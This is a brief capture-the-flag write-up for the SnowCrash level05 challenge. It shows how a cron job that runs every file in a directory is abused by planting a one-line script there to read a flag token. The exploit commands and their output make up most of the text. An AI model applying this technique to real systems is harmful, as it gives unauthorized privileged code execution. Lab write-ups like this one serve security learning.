# Snowcrash05

There's nothing in our home, but we're informed that we have mail
```sh
level05 password:
You have new mail.
level05:~$
```

The mail contains a cron command that launches a command

Here is the target command
```sh
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
So basically it calls all the files il /opt/openarenaserver/ , easy to exploit


```sh
level05:~$ echo "getflag > /tmp/log.txt" > /opt/openarenaserver/test.sh
level05:~$ cat /tmp/log.txt
cat: /tmp/log.txt: No such file or directory
level05@SnowCrash:~$ cat /tmp/log.txt
Check flag.Here is your token : REDACTED

```
We have to wait a bit for the server to exec the file, but here it is